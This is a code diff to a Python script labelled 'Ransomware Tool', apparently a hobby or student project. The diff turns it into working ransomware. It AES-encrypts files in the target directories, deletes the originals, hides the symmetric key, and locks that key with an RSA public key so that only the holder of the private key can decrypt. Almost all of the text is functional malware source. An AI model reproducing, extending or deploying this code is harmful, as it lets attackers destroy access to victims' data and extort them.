@@ -1,4 +1,10 @@
-# Import Libraries
+# Import Functions
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import padding
+from os import path
 import pyAesCrypt
 import string
 import random
@@ -39,8 +45,8 @@ def gen_key():
     l=list(passwd)
     random.shuffle(l)
     sym= ''.join(l)
-    print("Symmetric Key is: " + sym)
-    print()
+    #print("Symmetric Key is: " + sym)
+    #print()
 
 def enum_files():
     # Read Target Directories from 'dir.txt' & Enumerate Them
@@ -59,9 +65,20 @@ def enum_files():
         files+=dir_files
 
 def encrypt():
+    #Check if files have already been encrypted, exit if needed
+    ###This is to prevent the existing symmetric key from being lost forever
+    key_exists = path.exists('encrypted_sym')
+    if key_exists == True:
+      print('Existing key found, data is already encrypted...')
+      print()
+      print('This program does not support double encryption because doing so would overwrite the existing key and make the data that is already encrypted irrecoverable :(')
+      exit(0)
+    #If no symmetric key exists, create one
+    gen_key()
+    #Enumerate target directories
     enum_files()
     # Encrypt Files
-    clear()
+    #clear()
     global bufferSize
     bufferSize = 64 * 1024
     print('Encrypting Files...')
@@ -70,39 +87,96 @@ def encrypt():
         pyAesCrypt.encryptFile(i, new_name, sym, bufferSize)
         # Delete Originals
         os.remove(i)
+    #Encrypt Symmetric Key on Disk with Public Key
+    sym_bytes=bytes(sym, 'utf-8')
+    with open("public_key.pem", "rb") as key_file:
+        public_key = serialization.load_pem_public_key(
+            key_file.read(),
+            backend=default_backend()
+        )
+    encrypted = public_key.encrypt(
+        sym_bytes,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+    with open('encrypted_sym', 'wb') as f:
+        f.write(encrypted)
     print("Data is now encrypted :)")
     print()
+    exit(0)
 
 def decrypt():
-    enum_files()
-    # Decrypt Files
-    clear()
-    global bufferSize
-    bufferSize = 64 * 1024
-    print('Decrypting Files...')
-    for i in files:
-        new_name=i.replace('.aes', '')
-        pyAesCrypt.decryptFile(i, new_name, sym, bufferSize)
-        # Delete Originals
-        os.remove(i)
-    print("Data is now decrypted :)")
-    print()
+    private_key_exists = path.exists('private_key.pem')
+    if private_key_exists == True:
+      #Read Encrypted Symmetric Key
+      f = open("encrypted_sym", "rb")
+      encrypted=f.read()
+      #Read Private Key
+      with open("private_key.pem", "rb") as key_file:
+        private_key = serialization.load_pem_private_key(
+          key_file.read(),
+          password=None,
+          backend=default_backend()
+      )    
+      #Decrypt Symmetric Key with Private Key
+      original_message = private_key.decrypt(
+          encrypted,
+          padding.OAEP(
+              mgf=padding.MGF1(algorithm=hashes.SHA256()),
+              algorithm=hashes.SHA256(),
+              label=None
+          )
+      )
+      sym=original_message.decode('utf-8')
+      #Enumerate target directories
+      enum_files()
+      # Decrypt .aes Files
+      clear()
+      global bufferSize
+      bufferSize = 64 * 1024
+      print('Decrypting Files...')
+      for i in files:
+          if '.aes' in i: 
+            new_name=i.replace('.aes', '')
+            pyAesCrypt.decryptFile(i, new_name, sym, bufferSize)
+            # Delete Originals
+            os.remove(i)
+          else:
+            print('File ' + i + ' is not encrypted')
+      os.remove('encrypted_sym')
+      print("Data is now decrypted :)")
+      print()
+      exit(0)
+    else:
+      clear()
+      print("Looks like you don't have the private key :'(")
+      print()
+      print("Private key must be in current directory and be named 'private_key.pem'")
+      exit(0)
 
 # Main Program
 main_menu = """Ransomware Tool
-1. Gen-key
-2. Encrypt
-3. Decrypt
-4. Quit
+1. Encrypt
+2. Decrypt
+3. Quit
 """
 
 while True:
     uio = int_input_getter(main_menu, range(1, 5))
     if uio == 1:
-        gen_key()
-    elif uio == 2:
         encrypt()
-    elif uio == 3:
+    elif uio == 2:
         decrypt()
+    elif uio == 3:
+        exit(0)
     else:
         exit(0)
+
+###Sources###
+
+#Asymmetric cryptography: https://nitratine.net/blog/post/asymmetric-encryption-and-decryption-in-python/
+#Symmetric encryption and decryption: https://pypi.org/project/pyAesCrypt/
+#Random symmetric key generation: https://www.programiz.com/python-programming/examples/random-number
